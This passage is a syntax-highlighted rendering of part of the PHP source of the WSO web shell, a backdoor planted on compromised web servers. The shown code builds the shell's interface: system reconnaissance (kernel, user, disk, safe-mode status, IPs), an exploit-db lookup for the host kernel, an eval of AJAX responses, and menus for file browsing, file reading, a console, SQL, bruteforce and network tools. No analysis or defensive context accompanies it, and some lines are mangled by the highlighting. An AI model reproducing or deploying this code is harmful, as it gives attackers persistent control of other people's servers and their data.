<span class="lineno"> 130</span> <span class="s2">&quot;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;&#39;</span> <span class="o">:</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">))</span> <span class="o">.</span> <span class="s2">&quot;&#39;;</span>
<span class="lineno"> 131</span> <span class="s2">    var p3_ = &#39;&quot;</span> <span class="o">.</span> <span class="p">((</span><span class="nb">strpos</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">],</span> <span class="s2">&quot;</span>
<span class="lineno"> 132</span> <span class="s2">&quot;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;&#39;</span> <span class="o">:</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">))</span> <span class="o">.</span> <span class="s2">&quot;&#39;;</span>
<span class="lineno"> 133</span> <span class="s2">    var d = document;</span>
<span class="lineno"> 134</span> <span class="s2">  function set(a,c,p1,p2,p3,charset) {</span>
<span class="lineno"> 135</span> <span class="s2">      if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;</span>
<span class="lineno"> 136</span> <span class="s2">      if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;</span>
<span class="lineno"> 137</span> <span class="s2">      if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;</span>
<span class="lineno"> 138</span> <span class="s2">      if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;</span>
<span class="lineno"> 139</span> <span class="s2">      if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;</span>
<span class="lineno"> 140</span> <span class="s2">      if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;</span>
<span class="lineno"> 141</span> <span class="s2">  }</span>
<span class="lineno"> 142</span> <span class="s2">  function g(a,c,p1,p2,p3,charset) {</span>
<span class="lineno"> 143</span> <span class="s2">      set(a,c,p1,p2,p3,charset);</span>
<span class="lineno"> 144</span> <span class="s2">      d.mf.submit();</span>
<span class="lineno"> 145</span> <span class="s2">  }</span>
<span class="lineno"> 146</span> <span class="s2">  function a(a,c,p1,p2,p3,charset) {</span>
<span class="lineno"> 147</span> <span class="s2">      set(a,c,p1,p2,p3,charset);</span>
<span class="lineno"> 148</span> <span class="s2">      var params = &#39;ajax=true&#39;;</span>
<span class="lineno"> 149</span> <span class="s2">      for(i=0;i&lt;d.mf.elements.length;i++)</span>
<span class="lineno"> 150</span> <span class="s2">          params += &#39;&amp;&#39;+d.mf.elements[i].name+&#39;=&#39;+encodeURIComponent(d.mf.elements[i].value);</span>
<span class="lineno"> 151</span> <span class="s2">      sr(&#39;&quot;</span> <span class="o">.</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&#39;, params);</span>
<span class="lineno"> 152</span> <span class="s2">  }</span>
<span class="lineno"> 153</span> <span class="s2">  function sr(url, params) {</span>
<span class="lineno"> 154</span> <span class="s2">      if (window.XMLHttpRequest)</span>
<span class="lineno"> 155</span> <span class="s2">          req = new XMLHttpRequest();</span>
<span class="lineno"> 156</span> <span class="s2">      else if (window.ActiveXObject)</span>
<span class="lineno"> 157</span> <span class="s2">          req = new ActiveXObject(&#39;Microsoft.XMLHTTP&#39;);</span>
<span class="lineno"> 158</span> <span class="s2">        if (req) {</span>
<span class="lineno"> 159</span> <span class="s2">            req.onreadystatechange = processReqChange;</span>
<span class="lineno"> 160</span> <span class="s2">            req.open(&#39;POST&#39;, url, true);</span>
<span class="lineno"> 161</span> <span class="s2">            req.setRequestHeader (&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;);</span>
<span class="lineno"> 162</span> <span class="s2">            req.send(params);</span>
<span class="lineno"> 163</span> <span class="s2">        }</span>
<span class="lineno"> 164</span> <span class="s2">  }</span>
<span class="lineno"> 165</span> <span class="s2">  function processReqChange() {</span>
<span class="lineno"> 166</span> <span class="s2">      if( (req.readyState == 4) )</span>
<span class="lineno"> 167</span> <span class="s2">          if(req.status == 200) {</span>
<span class="lineno"> 168</span> <span class="s2">              var reg = new RegExp(</span><span class="se">\&quot;</span><span class="s2">(\d+)([\S\s]*)</span><span class="se">\&quot;</span><span class="s2">, &#39;m&#39;);</span>
<span class="lineno"> 169</span> <span class="s2">              var arr=reg.exec(req.responseText);</span>
<span class="lineno"> 170</span> <span class="s2">              eval(arr[2].substr(0, arr[1]));</span>
<span class="lineno"> 171</span> <span class="s2">          } else alert(&#39;Request error!&#39;);</span>
<span class="lineno"> 172</span> <span class="s2">  }</span>
<span class="lineno"> 173</span> <span class="s2">&lt;/script&gt;</span>
<span class="lineno"> 174</span> <span class="s2">&lt;head&gt;&lt;body&gt;&lt;div style=&#39;position:absolute;width:100%;background-color:#444;top:0;left:0;&#39;&gt;</span>
<span class="lineno"> 175</span> <span class="s2">&lt;form method=post name=mf style=&#39;display:none;&#39;&gt;</span>
<span class="lineno"> 176</span> <span class="s2">&lt;input type=hidden name=a&gt;</span>
<span class="lineno"> 177</span> <span class="s2">&lt;input type=hidden name=c&gt;</span>
<span class="lineno"> 178</span> <span class="s2">&lt;input type=hidden name=p1&gt;</span>
<span class="lineno"> 179</span> <span class="s2">&lt;input type=hidden name=p2&gt;</span>
<span class="lineno"> 180</span> <span class="s2">&lt;input type=hidden name=p3&gt;</span>
<span class="lineno"> 181</span> <span class="s2">&lt;input type=hidden name=charset&gt;</span>
<span class="lineno"> 182</span> <span class="s2">&lt;/form&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 183</span>         <span class="nv">$freeSpace</span> <span class="o">=</span> <span class="o">@</span><span class="nb">diskfreespace</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
<span class="lineno"> 184</span>         <span class="nv">$totalSpace</span> <span class="o">=</span> <span class="o">@</span><span class="nb">disk_total_space</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
<span class="lineno"> 185</span>         <span class="nv">$totalSpace</span> <span class="o">=</span> <span class="nv">$totalSpace</span> <span class="o">?</span> <span class="nv">$totalSpace</span> <span class="o">:</span> <span class="mi">1</span><span class="p">;</span>
<span class="lineno"> 186</span>         <span class="nv">$release</span> <span class="o">=</span> <span class="o">@</span><span class="nb">php_uname</span><span class="p">(</span><span class="s1">&#39;r&#39;</span><span class="p">);</span>
<span class="lineno"> 187</span>         <span class="nv">$kernel</span> <span class="o">=</span> <span class="o">@</span><span class="nb">php_uname</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">);</span>
<span class="lineno"> 188</span>         <span class="nv">$explink</span> <span class="o">=</span> <span class="s1">&#39;http://exploit-db.com/list.php?description=&#39;</span><span class="p">;</span>
<span class="lineno"> 189</span>         <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="s1">&#39;Linux&#39;</span><span class="p">,</span> <span class="nv">$kernel</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="nv">$explink</span><span class="o">.=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="s1">&#39;Linux Kernel &#39;</span> <span class="o">.</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$release</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">));</span>
<span class="lineno"> 190</span>         <span class="k">else</span> <span class="nv">$explink</span><span class="o">.=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$kernel</span> <span class="o">.</span> <span class="s1">&#39; &#39;</span> <span class="o">.</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$release</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">));</span>
<span class="lineno"> 191</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;posix_getegid&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 192</span>             <span class="nv">$user</span> <span class="o">=</span> <span class="o">@</span><span class="nb">get_current_user</span><span class="p">();</span>
<span class="lineno"> 193</span>             <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getmyuid</span><span class="p">();</span>
<span class="lineno"> 194</span>             <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getmygid</span><span class="p">();</span>
<span class="lineno"> 195</span>             <span class="nv">$group</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;</span>
<span class="lineno"> 196</span>         <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="lineno"> 197</span>             <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nb">posix_geteuid</span><span class="p">());</span>
<span class="lineno"> 198</span>             <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="nb">posix_getegid</span><span class="p">());</span>
<span class="lineno"> 199</span>             <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno"> 200</span>             <span class="nv">$uid</span> <span class="o">=</span> <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">];</span>
<span class="lineno"> 201</span>             <span class="nv">$group</span> <span class="o">=</span> <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno"> 202</span>             <span class="nv">$gid</span> <span class="o">=</span> <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;gid&#39;</span><span class="p">];</span>
<span class="lineno"> 203</span>         <span class="p">}</span>
<span class="lineno"> 204</span>         <span class="nv">$cwd_links</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="lineno"> 205</span>         <span class="nv">$path</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
<span class="lineno"> 206</span>         <span class="nv">$n</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
<span class="lineno"> 207</span>         <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 208</span>             <span class="nv">$cwd_links</span><span class="o">.=</span> <span class="s2">&quot;&lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 209</span>             <span class="k">for</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$j</span> <span class="o">&lt;=</span> <span class="nv">$i</span><span class="p">;</span><span class="nv">$j</span><span class="o">++</span><span class="p">)</span> <span class="nv">$cwd_links</span><span class="o">.=</span> <span class="nv">$path</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
<span class="lineno"> 210</span>             <span class="nv">$cwd_links</span><span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;&quot;</span> <span class="o">.</span> <span class="nv">$path</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;/&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 211</span>         <span class="p">}</span>
<span class="lineno"> 212</span>         <span class="nv">$charsets</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">,</span> <span class="s1">&#39;Windows-1251&#39;</span><span class="p">,</span> <span class="s1">&#39;KOI8-R&#39;</span><span class="p">,</span> <span class="s1">&#39;KOI8-U&#39;</span><span class="p">,</span> <span class="s1">&#39;cp866&#39;</span><span class="p">);</span>
<span class="lineno"> 213</span>         <span class="nv">$opt_charsets</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="lineno"> 214</span>         <span class="k">foreach</span> <span class="p">(</span><span class="nv">$charsets</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="nv">$opt_charsets</span><span class="o">.=</span> <span class="s1">&#39;&lt;option value=&quot;&#39;</span> <span class="o">.</span> <span class="nv">$item</span> <span class="o">.</span> <span class="s1">&#39;&quot; &#39;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$item</span> <span class="o">?</span> <span class="s1">&#39;selected&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&gt;&#39;</span> <span class="o">.</span> <span class="nv">$item</span> <span class="o">.</span> <span class="s1">&#39;&lt;/option&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 215</span>         <span class="nv">$m</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Sec. Info&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;SecInfo&#39;</span><span class="p">,</span> <span class="s1">&#39;Files&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;FilesMan&#39;</span><span class="p">,</span> <span class="s1">&#39;Console&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Console&#39;</span><span class="p">,</span> <span class="s1">&#39;Sql&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Sql&#39;</span><span class="p">,</span> <span class="s1">&#39;Php&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Php&#39;</span><span class="p">,</span> <span class="s1">&#39;Safe mode&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;SafeMode&#39;</span><span class="p">,</span> <span class="s1">&#39;String tools&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;StringTools&#39;</span><span class="p">,</span> <span class="s1">&#39;Bruteforce&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Bruteforce&#39;</span><span class="p">,</span> <span class="s1">&#39;Network&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Network&#39;</span><span class="p">);</span>
<span class="lineno"> 216</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;auth_pass&#39;</span><span class="p">]))</span> <span class="nv">$m</span><span class="p">[</span><span class="s1">&#39;Logout&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;Logout&#39;</span><span class="p">;</span>
<span class="lineno"> 217</span>         <span class="nv">$m</span><span class="p">[</span><span class="s1">&#39;Self remove&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SelfRemove&#39;</span><span class="p">;</span>
<span class="lineno"> 218</span>         <span class="nv">$menu</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="lineno"> 219</span>         <span class="k">foreach</span> <span class="p">(</span><span class="nv">$m</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="nv">$menu</span><span class="o">.=</span> <span class="s1">&#39;&lt;th width=&quot;&#39;</span> <span class="o">.</span> <span class="p">(</span><span class="nx">int</span><span class="p">)(</span><span class="mi">100</span> <span class="o">/</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$m</span><span class="p">))</span> <span class="o">.</span> <span class="s1">&#39;%&quot;&gt;[ &lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;&#39;</span> <span class="o">.</span> <span class="nv">$v</span> <span class="o">.</span> <span class="s1">&#39;\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&gt;&#39;</span> <span class="o">.</span> <span class="nv">$k</span> <span class="o">.</span> <span class="s1">&#39;&lt;/a&gt; ]&lt;/th&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 220</span>         <span class="nv">$drives</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno"> 221</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;win&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 222</span>             <span class="k">foreach</span> <span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">,</span> <span class="s1">&#39;z&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$drive</span><span class="p">)</span> <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$drive</span> <span class="o">.</span> <span class="s1">&#39;:\&#39;))</span>
<span class="lineno"> 223</span> <span class="s1">          $drives .= &#39;</span> <span class="o">&lt;</span> <span class="nx">ahref</span> <span class="o">=</span> <span class="s2">&quot;#&quot;</span><span class="nx">onclick</span> <span class="o">=</span> <span class="s2">&quot;g(\&#39;FilesMan\&#39;,\&#39;&#39;.</span><span class="si">$drive</span><span class="s2">.&#39;:/\&#39;)&quot;</span> <span class="o">&gt;</span> <span class="p">[</span><span class="s1">&#39;.$drive.&#39;</span><span class="p">]</span> <span class="o">&lt;</span> <span class="o">/</span> <span class="nx">a</span> <span class="o">&gt;</span> <span class="s1">&#39;;</span>
<span class="lineno"> 224</span> <span class="s1">  }</span>
<span class="lineno"> 225</span> <span class="s1">  echo &#39;</span> <span class="o">&lt;</span> <span class="nx">tableclass</span> <span class="o">=</span> <span class="nx">infocellpadding</span> <span class="o">=</span> <span class="mi">3</span><span class="nx">cellspacing</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">width</span> <span class="o">=</span> <span class="mi">100</span> <span class="o">%</span> <span class="o">&gt;</span> <span class="o">&lt;</span> <span class="nx">tr</span> <span class="o">&gt;</span> <span class="o">&lt;</span> <span class="nx">tdwidth</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="o">&lt;</span> <span class="nx">span</span> <span class="o">&gt;</span> <span class="o">&lt;</span> <span class="nx">fontcolor</span> <span class="o">=</span> <span class="s2">&quot;red&quot;</span> <span class="o">&gt;</span> <span class="nx">Uname</span><span class="o">:</span> <span class="o">&lt;</span> <span class="nx">br</span> <span class="o">&gt;</span> <span class="nx">User</span><span class="o">:</span> <span class="o">&lt;</span> <span class="nx">br</span> <span class="o">&gt;</span> <span class="nx">Php</span><span class="o">:</span> <span class="o">&lt;</span> <span class="nx">br</span> <span class="o">&gt;</span> <span class="nx">Hdd</span><span class="o">:</span> <span class="o">&lt;</span> <span class="nx">br</span> <span class="o">&gt;</span> <span class="nx">Cwd</span><span class="o">:</span> <span class="o">&lt;</span> <span class="o">/</span> <span class="nx">font</span> <span class="o">&gt;</span> <span class="s1">&#39; . ($GLOBALS[&#39;</span><span class="nx">os</span><span class="s1">&#39;] == &#39;</span><span class="nx">win</span><span class="s1">&#39;?&#39;</span> <span class="o">&lt;</span> <span class="nx">br</span> <span class="o">&gt;</span> <span class="o">&lt;</span> <span class="nx">fontcolor</span> <span class="o">=</span> <span class="s2">&quot;red&quot;</span> <span class="o">&gt;</span> <span class="nx">Drives</span><span class="o">:</span> <span class="o">&lt;</span> <span class="o">/</span> <span class="nx">font</span> <span class="o">&gt;</span> <span class="s1">&#39;:&#39;&#39;) . &#39;</span> <span class="o">&lt;</span> <span class="o">/</span> <span class="nx">span</span> <span class="o">&gt;</span> <span class="o">&lt;</span> <span class="o">/</span> <span class="nx">td</span> <span class="o">&gt;</span> <span class="s1">&#39;</span>
<span class="lineno"> 226</span> <span class="s1">       . &#39;</span> <span class="o">&lt;</span> <span class="nx">td</span> <span class="o">&gt;</span> <span class="o">&lt;</span> <span class="nx">nobr</span> <span class="o">&gt;</span> <span class="s1">&#39; . substr(@php_uname(), 0, 120) . &#39;</span> <span class="o">&lt;</span> <span class="nx">ahref</span> <span class="o">=</span> <span class="s2">&quot;&#39; . </span><span class="si">$explink</span><span class="s2"> . &#39;&quot;</span><span class="nx">target</span> <span class="o">=</span> <span class="nx">_blank</span> <span class="o">&gt;</span> <span class="p">[</span><span class="nx">exploit</span> <span class="o">-</span> <span class="nx">db</span> <span class="o">.</span> <span class="nx">com</span><span class="p">]</span> <span class="o">&lt;</span> <span class="o">/</span> <span class="nx">a</span> <span class="o">&gt;</span> <span class="o">&lt;</span> <span class="o">/</span> <span class="nx">nobr</span> <span class="o">&gt;</span> <span class="o">&lt;</span> <span class="nx">br</span> <span class="o">&gt;</span> <span class="s1">&#39; . $uid . &#39;</span><span class="p">(</span><span class="s1">&#39; . $user . &#39;</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nx">span</span> <span class="o">&gt;</span> <span class="o">&lt;</span> <span class="nx">fontcolor</span> <span class="o">=</span> <span class="s2">&quot;red&quot;</span> <span class="o">&gt;</span> <span class="nx">Group</span><span class="o">:</span> <span class="o">&lt;</span> <span class="o">/</span> <span class="nx">font</span> <span class="o">&gt;</span> <span class="o">&lt;</span> <span class="o">/</span> <span class="nx">span</span> <span class="o">&gt;</span> <span class="s1">&#39; . $gid . &#39;</span><span class="p">(</span><span class="s1">&#39; . $group . &#39;</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nx">br</span> <span class="o">&gt;</span> <span class="s1">&#39; . @phpversion() . &#39;</span> <span class="o">&lt;</span> <span class="nx">span</span> <span class="o">&gt;</span> <span class="o">&lt;</span> <span class="nx">fontcolor</span> <span class="o">=</span> <span class="s2">&quot;red&quot;</span> <span class="o">&gt;</span> <span class="nx">Safemode</span><span class="o">:</span> <span class="o">&lt;</span> <span class="o">/</span> <span class="nx">font</span> <span class="o">&gt;</span> <span class="o">&lt;</span> <span class="o">/</span> <span class="nx">span</span> <span class="o">&gt;</span> <span class="s1">&#39; . ($GLOBALS[&#39;</span><span class="nx">safe_mode</span><span class="s1">&#39;]?&#39;</span> <span class="o">&lt;</span> <span class="nx">fontcolor</span> <span class="o">=</span> <span class="nx">green</span> <span class="o">&gt;</span> <span class="nx">ON</span> <span class="o">&lt;</span> <span class="o">/</span> <span class="nx">font</span> <span class="o">&gt;</span> <span class="s1">&#39;:&#39;</span> <span class="o">&lt;</span> <span class="nx">fontcolor</span> <span class="o">=</span> <span class="c1">#00bb00&gt;&lt;b&gt;OFF&lt;/b&gt;&lt;/font&gt;&#39;)</span>
<span class="lineno"> 227</span>                                              <span class="o">.</span> <span class="s1">&#39; &lt;a href=# onclick=&quot;g(\&#39;Php\&#39;,null,\&#39;\&#39;,\&#39;info\&#39;)&quot;&gt;[ phpinfo ]&lt;/a&gt; &lt;span&gt;&lt;font color=&quot;red&quot; &gt;Datetime:&lt;/font&gt;&lt;/span&gt; &#39;</span> <span class="o">.</span> <span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span> <span class="o">.</span> <span class="nx">wsoViewSize</span><span class="p">(</span><span class="nv">$totalSpace</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; &lt;span&gt;&lt;font color=&quot;red&quot; &gt;Free:&lt;/font&gt;&lt;/span&gt; &#39;</span> <span class="o">.</span> <span class="nx">wsoViewSize</span><span class="p">(</span><span class="nv">$freeSpace</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; (&#39;</span> <span class="o">.</span> <span class="p">(</span><span class="nx">int</span><span class="p">)(</span><span class="nv">$freeSpace</span> <span class="o">/</span> <span class="nv">$totalSpace</span> <span class="o">*</span> <span class="mi">100</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;%)&lt;br&gt;&#39;</span> <span class="o">.</span> <span class="nv">$cwd_links</span> <span class="o">.</span> <span class="s1">&#39; &#39;</span> <span class="o">.</span> <span class="nx">wsoPermsColor</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39; &lt;a href=# onclick=&quot;g(\&#39;FilesMan\&#39;,\&#39;&#39;</span> <span class="o">.</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;home_cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&gt;[ home ]&lt;/a&gt;&lt;br&gt;&#39;</span> <span class="o">.</span> <span class="nv">$drives</span> <span class="o">.</span> <span class="s1">&#39;&lt;/td&gt;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&lt;td width=1 align=right&gt;&lt;nobr&gt;&lt;select onchange=&quot;g(null,null,null,null,null,this.value)&quot;&gt;&lt;optgroup label=&quot;Page charset&quot;&gt;&#39;</span> <span class="o">.</span> <span class="nv">$opt_charsets</span> <span class="o">.</span> <span class="s1">&#39;&lt;/optgroup&gt;&lt;/select&gt;&lt;br&gt;&lt;span&gt;Server IP:&lt;/span&gt;&lt;br&gt;&#39;</span> <span class="o">.</span> <span class="o">@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;SERVER_ADDR&quot;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&lt;span&gt;Client IP:&lt;/span&gt;&lt;br&gt;&#39;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/nobr&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&lt;table style=&quot;border-top:2px solid #333;&quot; cellpadding=3 cellspacing=0 width=100%&gt;&lt;tr&gt;&#39;</span> <span class="o">.</span> <span class="nv">$menu</span> <span class="o">.</span> <span class="s1">&#39;&lt;/tr&gt;&lt;/table&gt;&lt;div style=&quot;margin:5&quot;&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 228</span>                                         <span class="p">}</span>
<span class="lineno"> 229</span>                                         <span class="k">function</span> <span class="nf">wsoFooter</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno"> 230</span>                                             <span class="nv">$is_writable</span> <span class="o">=</span> <span class="nb">is_writable</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="s2">&quot; &lt;font color=&#39;#25ff00&#39;&gt;(Writeable)&lt;/font&gt;&quot;</span> <span class="o">:</span> <span class="s2">&quot; &lt;font color=red&gt;(Not writable)&lt;/font&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 231</span>                                             <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="lineno"> 232</span> <span class="s2">&lt;/div&gt;</span>
<span class="lineno"> 233</span> <span class="s2">&lt;table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style=&#39;border-top:2px solid #333;border-bottom:2px solid #333;&#39;&gt;</span>
<span class="lineno"> 234</span> <span class="s2">  &lt;tr&gt;</span>
<span class="lineno"> 235</span> <span class="s2">      &lt;td&gt;&lt;form onsubmit=&#39;g(null,this.c.value,</span><span class="se">\&quot;\&quot;</span><span class="s2">);return false;&#39;&gt;&lt;span&gt;Change dir:&lt;/span&gt;&lt;br&gt;&lt;input class=&#39;toolsInp&#39; type=text name=c value=&#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;&lt;input type=submit value=&#39;&gt;&gt;&#39;&gt;&lt;/form&gt;&lt;/td&gt;</span>
<span class="lineno"> 236</span> <span class="s2">      &lt;td&gt;&lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(&#39;FilesTools&#39;,null,this.f.value);return false;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;span&gt;Read file:&lt;/span&gt;&lt;br&gt;&lt;input class=&#39;toolsInp&#39; type=text name=f&gt;&lt;input type=submit value=&#39;&gt;&gt;&#39;&gt;&lt;/form&gt;&lt;/td&gt;</span>
<span class="lineno"> 237</span> <span class="s2">  &lt;/tr&gt;&lt;tr&gt;</span>
